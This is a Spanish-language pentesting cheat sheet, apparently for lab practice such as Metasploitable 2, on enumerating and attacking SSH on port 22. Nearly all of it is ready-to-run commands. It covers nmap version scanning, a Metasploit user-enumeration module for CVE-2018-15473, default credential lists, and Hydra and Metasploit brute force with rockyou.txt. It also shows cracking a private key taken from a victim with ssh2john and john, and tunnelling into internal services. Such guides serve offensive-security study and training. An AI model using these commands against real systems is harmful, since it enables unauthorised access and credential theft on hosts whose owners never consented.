# Enumeración y Ataque — SSH (Puerto 22)

## Descripción

SSH (Secure Shell) es el protocolo estándar de acceso remoto en Linux. Rara vez es vulnerable directamente, pero es muy útil una vez que tienes credenciales obtenidas por otro medio.

---

## Paso 1 — Enumeración con Nmap

```shell
nmap -p 22 -sV -sC TARGET_IP
```

Anota la versión exacta de OpenSSH. Versiones muy antiguas pueden tener exploits.

---

## Paso 2 — Buscar versión vulnerable

```shell
searchsploit openssh VERSION
```

Vulnerabilidades históricas relevantes:

| Versión | CVE | Descripción |
|---------|-----|-------------|
| OpenSSH < 7.7 | CVE-2018-15473 | User enumeration |
| OpenSSH 2.3 | CVE-2001-0144 | Buffer overflow |

### Enumeración de usuarios (CVE-2018-15473)

```shell
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

---

## Paso 3 — Credenciales por defecto

```shell
ssh root@TARGET_IP
ssh admin@TARGET_IP
ssh user@TARGET_IP
# Contraseñas: root, admin, password, toor, 1234
```

En Metasploitable 2:
```shell
ssh msfadmin@TARGET_IP
# Contraseña: msfadmin
```

---

## Paso 4 — Fuerza bruta

```shell
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4

# Con Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## Paso 5 — Clave SSH privada encontrada

Si encuentras un archivo `id_rsa` en la máquina víctima (durante post-explotación):

```shell
# Copiar la clave a Kali y darle permisos correctos
chmod 600 id_rsa

# Conectar con la clave
ssh -i id_rsa usuario@TARGET_IP

# Si la clave tiene passphrase, crackearla
ssh2john id_rsa > hash_rsa.txt
john hash_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Paso 6 — Port Forwarding con SSH

Útil para acceder a servicios internos de la víctima desde Kali:

```shell
# Acceder al puerto 8080 interno de la víctima desde Kali
ssh -L 8080:127.0.0.1:8080 usuario@TARGET_IP

# Ahora en Kali puedes visitar http://localhost:8080
```

---

## Checklist rápido

```
[ ] nmap -sV para ver versión exacta
[ ] searchsploit openssh VERSION
[ ] Credenciales por defecto (root:root, admin:admin, msfadmin:msfadmin)
[ ] Fuerza bruta con Hydra si tienes un usuario conocido
[ ] ¿Encontraste id_rsa en otra parte? → ssh -i id_rsa
[ ] ¿Necesitas acceder a un servicio interno? → port forwarding
```
